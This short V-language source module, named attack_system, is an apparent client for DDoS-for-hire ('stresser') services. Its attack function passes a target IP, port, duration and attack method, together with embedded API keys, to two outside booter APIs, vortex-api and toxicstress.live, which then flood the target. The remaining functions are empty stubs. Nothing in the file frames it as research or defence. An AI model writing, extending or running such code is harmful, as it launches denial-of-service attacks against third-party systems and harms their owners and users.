module attack_system

import net.http

pub fn attack(ip string, port string, time string, method string) {
	mut resp := http.get_text("https://api.vortex-api.com/api?key=v-raWfgcs4&host=${ip}&port=${port}&time=${time}&method=${method}")
	mut respp := http.get_text("https://toxicstress.live/api.go/key=N4N0-934213453&host=${ip}&port=${port}&time=${time}&method=${method}")
	println(resp)
	println(respp)
}


pub fn send_attack(ip string, port string, time string, method string) {

}

pub fn fill_api(ip string, port string, time string, method string) {

}

pub fn get_all_api() {
	
}